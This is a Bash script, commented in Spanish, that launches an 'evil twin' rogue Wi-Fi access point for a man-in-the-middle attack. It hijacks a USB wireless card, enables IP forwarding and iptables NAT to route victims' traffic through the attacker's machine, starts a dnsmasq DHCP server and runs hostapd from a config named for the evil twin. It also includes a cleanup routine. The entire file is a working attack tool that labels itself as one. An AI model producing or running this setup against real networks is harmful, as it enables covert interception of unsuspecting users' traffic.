#!/bin/bash

# ==========================================
# CONFIGURACIÓN DEL GEMELO MALVADO
# ==========================================
IFACE_INTERNET="wlo1"             # Tarjeta con internet legítimo
IFACE_AP="wlxccbabd6179b5"        # Tarjeta USB para el ataque
CONF_FILE="evil_twin_movil.conf"  # Archivo de config de hostapd

# Función de limpieza que se ejecuta al pulsar Ctrl+C
cleanup() {
    echo -e "\n\n[!] Abortando ataque..."
    echo "[*] Matando servicios (hostapd, dnsmasq)..."
    sudo killall dnsmasq 2>/dev/null
    sudo killall hostapd 2>/dev/null
    
    echo "[*] Devolviendo $IFACE_AP a NetworkManager..."
    sudo nmcli device set $IFACE_AP managed yes
    
    echo "[*] Limpiando enrutamiento (iptables)..."
    sudo iptables -t nat -F
    sudo iptables -F
    
    echo "[*] Restaurando red..."
    sudo ip addr flush dev $IFACE_AP
    echo "[V] Sistema devuelto a la normalidad. ¡Buen hackeo!"
    exit 0
}

# Capturamos la señal de interrupción (Ctrl+C) para lanzar la limpieza
trap cleanup SIGINT

echo "=========================================="
echo "    LANZANDO ATAQUE MAN-IN-THE-MIDDLE     "
echo "=========================================="

echo "[1/5] Limpiando procesos conflictivos..."
sudo killall dnsmasq hostapd wpa_supplicant 2>/dev/null
sudo rfkill unblock all

echo "[2/5] Secuestrando tarjeta USB ($IFACE_AP)..."
sudo nmcli device set $IFACE_AP managed no
sudo ip link set $IFACE_AP down
sudo ip addr flush dev $IFACE_AP
sudo ip link set $IFACE_AP up
sudo ip addr add 10.0.0.1/24 dev $IFACE_AP

echo "[3/5] Creando puente mágico a Internet (NAT en $IFACE_INTERNET)..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -t nat -A POSTROUTING -o $IFACE_INTERNET -j MASQUERADE
sudo iptables -A FORWARD -i $IFACE_AP -o $IFACE_INTERNET -j ACCEPT
sudo iptables -A FORWARD -i $IFACE_INTERNET -o $IFACE_AP -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[4/5] Lanzando servidor DHCP en segundo plano..."
sudo dnsmasq -C /dev/null -kd -F 10.0.0.10,10.0.0.100 -i $IFACE_AP --except-interface=lo --bind-dynamic -R -S 8.8.8.8 &

echo "[5/5] Levantando Punto de Acceso..."
echo "------------------------------------------"
echo "[!!!] ATAQUE ACTIVO - PRESIONA Ctrl+C PARA DETENER [!!!]"
echo "------------------------------------------"
# Ejecutamos hostapd en primer plano para ver los logs en vivo
sudo hostapd $CONF_FILE
